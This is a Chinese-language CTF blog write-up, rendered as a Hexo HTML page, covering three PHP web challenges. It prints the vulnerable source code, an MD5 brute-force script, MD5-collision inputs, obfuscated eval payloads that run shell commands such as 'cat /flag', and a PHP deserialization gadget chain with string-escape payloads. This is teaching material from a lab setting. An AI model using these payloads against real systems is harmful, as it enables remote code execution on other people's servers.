@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="rce123456789101112131415161718192021222324252627&lt;?phphighlight_file(__FILE__);error_reporting(0);echo &quot;Let&#x27;s warm up first!\n&quot;;$a &#x3D; $_GET[&#x27;a&#x27;];$b &#x3D; $_POST[&#x27;b&#x27;];$c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web的wp部分">
+<meta property="og:url" content="http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/index.html">
+<meta property="og:site_name" content="jujub3">
+<meta property="og:description" content="rce123456789101112131415161718192021222324252627&lt;?phphighlight_file(__FILE__);error_reporting(0);echo &quot;Let&#x27;s warm up first!\n&quot;;$a &#x3D; $_GET[&#x27;a&#x27;];$b &#x3D; $_POST[&#x27;b&#x27;];$c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/web%E7%9A%84wp%E9%83%A8%E5%88%86/1745939244504-13c06d97-2395-42f7-92c9-aaf7ccf80046.png">
+<meta property="og:image" content="http://example.com/image/web%E7%9A%84wp%E9%83%A8%E5%88%86/1745939298166-8f59f19d-32ee-422c-906b-b3d2a007295a.png">
+<meta property="og:image" content="http://example.com/image/web%E7%9A%84wp%E9%83%A8%E5%88%86/1745940304864-9f42f733-6bac-4415-81bf-da670744fb86.png">
+<meta property="og:image" content="http://example.com/image/web%E7%9A%84wp%E9%83%A8%E5%88%86/1746113263311-697b0d9b-55f2-420b-996f-4053a057f955.png">
+<meta property="og:image" content="http://example.com/image/web%E7%9A%84wp%E9%83%A8%E5%88%86/1746112110709-6b3c9065-0313-4c5c-be73-335cb07609f7.png">
+<meta property="article:published_time" content="2025-05-01T16:42:48.000Z">
+<meta property="article:modified_time" content="2025-05-01T16:46:51.553Z">
+<meta property="article:author" content="jujub3">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/web%E7%9A%84wp%E9%83%A8%E5%88%86/1745939244504-13c06d97-2395-42f7-92c9-aaf7ccf80046.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/head.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>web的wp部分</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&text=web的wp部分"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&title=web的wp部分"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&is_video=false&description=web的wp部分"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web的wp部分&body=Check out this article: http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&title=web的wp部分"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&title=web的wp部分"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&title=web的wp部分"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&title=web的wp部分"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&name=web的wp部分&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/02/web%E7%9A%84wp%E9%83%A8%E5%88%86/&t=web的wp部分"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#rce"><span class="toc-number">1.</span> <span class="toc-text">rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unset"><span class="toc-number">2.</span> <span class="toc-text">unset</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unserialize"><span class="toc-number">3.</span> <span class="toc-text">unserialize</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        web的wp部分
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">jujub3</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-01T16:42:48.000Z" class="dt-published" itemprop="datePublished">2025-05-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;Let&#x27;s warm up first!\n&quot;;</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_POST[&#x27;b&#x27;];</span><br><span class="line">$c = $_POST[&#x27;c&#x27;];</span><br><span class="line">$cmd = $_POST[&#x27;cmd&#x27;];</span><br><span class="line"></span><br><span class="line">if (substr(md5($a), -3) === &quot;4a2&quot;) &#123;</span><br><span class="line">    echo &quot;nice!&quot;;</span><br><span class="line">    if($b != $c &amp;&amp; md5($b) === md5($c))&#123;</span><br><span class="line">        echo &quot;Well done! flag就给你吧...&quot;;</span><br><span class="line">        if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$cmd))&#123;</span><br><span class="line">            die(&quot;hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            @eval($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;no!!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;nonono!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第一层if爆破一个值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">def find_all_md5_matches():</span><br><span class="line">    matches = []</span><br><span class="line">    for num in range(1, 1000000):</span><br><span class="line">        md5_hash = hashlib.md5(str(num).encode()).hexdigest()</span><br><span class="line">        # 检查最后3位是否匹配</span><br><span class="line">        if md5_hash[-3:] == &#x27;4a2&#x27;:</span><br><span class="line">            print(f&quot;匹配数字: &#123;num&#125;, MD5: &#123;md5_hash&#125;&quot;)</span><br><span class="line">            matches.append(num)</span><br><span class="line">    if matches:</span><br><span class="line">        print(f&quot;\n总共找到 &#123;len(matches)&#125; 个匹配项。&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;在指定范围内未找到匹配的数字&quot;)</span><br><span class="line">    return matches</span><br><span class="line"># 执行查找</span><br><span class="line">find_all_md5_matches()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>第二层强比较就行了</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?a=2014</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;c=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;cmd=(~&#x27;%8C%86%8C%8B%9A%92&#x27;)(~&#x27;%93%8C%DF%D0&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../image/web%E7%9A%84wp%E9%83%A8%E5%88%86/1745939244504-13c06d97-2395-42f7-92c9-aaf7ccf80046.png" alt="img"></p>
+<p>最后改成cat &#x2F;flag就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;c=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;cmd=(~&#x27;%8C%86%8C%8B%9A%92&#x27;)(~&#x27;%9C%9E%8B%DF%D0%99%93%9E%98&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../image/web%E7%9A%84wp%E9%83%A8%E5%88%86/1745939298166-8f59f19d-32ee-422c-906b-b3d2a007295a.png" alt="img"></p>
+<h3 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$a = new class &#123;</span><br><span class="line">    function getflag()</span><br><span class="line">    &#123;</span><br><span class="line">        system(&#x27;cat /flag&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">unset($a);</span><br><span class="line">$a = $_GET[&#x27;class&#x27;];</span><br><span class="line">$f = new $a();</span><br><span class="line">$f-&gt;getflag();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：（对列进行爆破，不行就范围开大点）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?class=class@anonymous%00/var/www/html/index.php:4$&#123;&#123;int(1-10)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/web%E7%9A%84wp%E9%83%A8%E5%88%86/1745940304864-9f42f733-6bac-4415-81bf-da670744fb86.png" alt="img"></p>
+<p>多试几次就好了</p>
+<h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in /flag</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class H&#123;</span><br><span class="line">    public $name,$key,$basedata,$ob;</span><br><span class="line">    function __construct($str)&#123;</span><br><span class="line">        $this-&gt;name=$str;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        if($this-&gt;key===&quot;hctf&quot;)&#123;</span><br><span class="line">            $this-&gt;ob=unserialize($this-&gt;basedata);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;no!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        $this-&gt;a-&gt;rce();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class T&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $t;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;a=&quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;b=$this-&gt;t;</span><br><span class="line">        die($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class F&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    function rce()&#123;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data=$_POST[&quot;data&quot;];</span><br><span class="line">if(isset($data))</span><br><span class="line">&#123;</span><br><span class="line">    $shell=serialize(new H($data));</span><br><span class="line">    $data_replace=preg_replace(&#x27;/hnctf/&#x27;, &#x27;hacker&#x27;, $shell);</span><br><span class="line">    unserialize($data_replace);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>首先找链子：</p>
+<p>T::__destruct()–&gt;C::__toString()–&gt;F::rce()</p>
+<p>首先反序列化触发weakup()魔术方法，php环境：7.2.34   </p>
+<p>不满足通过改变类属性个数的值绕过weakup()魔术方法。因为最后是要通过die函数触发C::__toString() 这个魔术方法， 这里需要用到引用，将 $a&#x3D;&amp;$b</p>
+<p>然后就可以通过改变 $t 的值简介改变 $a 的值，最后执行die函数的时候把 $t 赋值为 一个对象 C 就可以按链子走了。 </p>
+<p>在本地调试：index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in /flag</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class C&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        $this-&gt;a-&gt;rce();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class T&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $t;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;a=&quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;b=$this-&gt;t;</span><br><span class="line">        die($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class F&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    function rce()&#123;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data=$_POST[&quot;data&quot;];</span><br><span class="line">unserialize($data);</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C&#123;</span><br><span class="line">    public $a;</span><br><span class="line">&#125;</span><br><span class="line">class T&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $t;</span><br><span class="line">&#125;</span><br><span class="line">class F&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">&#125;</span><br><span class="line">$test=new T();</span><br><span class="line">$test-&gt;a=&amp;$test-&gt;b;</span><br><span class="line">$test-&gt;t=new C();</span><br><span class="line">$test-&gt;t-&gt;a=new F();</span><br><span class="line">$test-&gt;t-&gt;a-&gt;cmd=&#x27;system(&quot;dir&quot;);&#x27;;</span><br><span class="line">echo serialize($test);</span><br></pre></td></tr></table></figure>
+
+<p>发现是可以执行命令的。</p>
+<p><img src="/../image/web%E7%9A%84wp%E9%83%A8%E5%88%86/1746113263311-697b0d9b-55f2-420b-996f-4053a057f955.png" alt="img"></p>
+<p>但是题目给了一个具体的序列化对象 H</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$shell=serialize(new H($data));</span><br><span class="line">$data_replace=preg_replace(&#x27;/hnctf/&#x27;, &#x27;hacker&#x27;, $shell);</span><br><span class="line">unserialize($data_replace); </span><br></pre></td></tr></table></figure>
+
+<p>就意味着不能直接按我们刚刚的链子走，需要通过 类 H中的 unserialize函数来反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class H&#123;</span><br><span class="line">    public $name,$key,$basedata,$ob;</span><br><span class="line">    function __construct($str)&#123;</span><br><span class="line">        $this-&gt;name=$str;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        if($this-&gt;key===&quot;hctf&quot;)&#123;</span><br><span class="line">            $this-&gt;ob=unserialize($this-&gt;basedata);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;no!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>注意到：$data_replace&#x3D;preg_replace(‘&#x2F;hnctf&#x2F;‘, ‘hacker’, $shell);</p>
+<p>有个字符串替换的操作，这里存在字符串逃逸漏洞。利用这点可以rce。</p>
+<p>看代码执行过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($data))</span><br><span class="line">&#123;</span><br><span class="line">    $shell=serialize(new H($data));</span><br><span class="line">    $data_replace=preg_replace(&#x27;/hnctf/&#x27;, &#x27;hacker&#x27;, $shell);</span><br><span class="line">    unserialize($data_replace);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入一个data，调用 H的构造函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function __construct($str)&#123;</span><br><span class="line">    $this-&gt;name=$str;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>也就是给 name赋值（意味着只有name是可控的）。接着序列化H这个类，然后替换序列化字符串hnctf为hacker，这里增多了一个字符（后面会用到）</p>
+<p>最后反序列化触发  __wakeup() 魔术方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function __wakeup()&#123;</span><br><span class="line">    if($this-&gt;key===&quot;hctf&quot;)&#123;</span><br><span class="line">        $this-&gt;ob=unserialize($this-&gt;basedata);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>前面提到，我们要执行这个魔术方法里的 unserialize 函数，就需要让 key&#x3D;hctf，这里需要用到字符串逃逸了。</p>
+<p>这里可以先看一下正常输出：</p>
+<p>O:1:”H”:4:{s:4:”name”;s:5:”hnctf”;s:3:”key”;N;s:8:”basedata”;N;s:2:”ob”;N;}</p>
+<p>然后只有name是我们可控的，如果我们传入的data含有hnctf就会替换成hacker，导致长度跟实际长度不匹配，不能进行反序列化（实际长度变成了6）。</p>
+<p>O:1:”H”:4:{s:4:”name”;s:5:”hacker”;s:3:”key”;N;s:8:”basedata”;N;s:2:”ob”;N;}</p>
+<p>而我们最后需要的payload是形如这样的：(将key值赋值为hctf进入if语句执行unserialize()函数）</p>
+<p>O:1:”H”:4:{s:4:”name”;s:4:”hctf”;s:3:”key”;s:4:”hctf”;s:8:”basedata”;s:106:”O:1:”T”:3:{s:1:”a”;N;s:1:”b”;R:2;s:1:”t”;O:1:”C”:1:{s:1:”a”;O:1:”F”:1:{s:3:”cmd”;s:14:”system(“dir”);”;}}}”;s:2:”ob”;N;}</p>
+<p>但是我们只能修改name的值，也就是需要将下面这一段包含在name的值里，长度为165</p>
+<p>“;s:3:”key”;s:4:”hctf”;s:8:”basedata”;s:106:”O:1:”T”:3:{s:1:”a”;N;s:1:”b”;R:2;s:1:”t”;O:1:”C”:1:{s:1:”a”;O:1:”F”:1:{s:3:”cmd”;s:14:”system(“dir”);”;}}}”;s:2:”ob”;N;}</p>
